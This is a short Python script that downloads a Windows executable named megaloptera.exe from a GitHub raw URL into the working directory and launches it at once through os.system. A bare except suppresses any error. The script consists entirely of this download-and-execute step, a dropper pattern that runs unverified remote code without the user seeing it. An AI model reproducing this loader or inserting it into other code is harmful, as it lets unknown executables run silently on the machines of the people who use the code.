######
#Author Lord District
######
import os
import requests

def launch(save_path):
    try:
        os.system(f"{save_path}")      
    except:
        pass
def download_file(url, save_directory):
    response = requests.get(url)
    if response.status_code == 200:
        file_name = url.split("/")[-1]
        save_path = os.path.join(save_directory, file_name)
        with open(save_path, 'wb') as file:
            file.write(response.content)
        launch(save_path)
    else:
        return None
github_raw_url = "https://raw.githubusercontent.com/LopoDistrict/megaloptera/main/test/megaloptera.exe"

save_path = os.getcwd()
download_file(github_raw_url, save_path)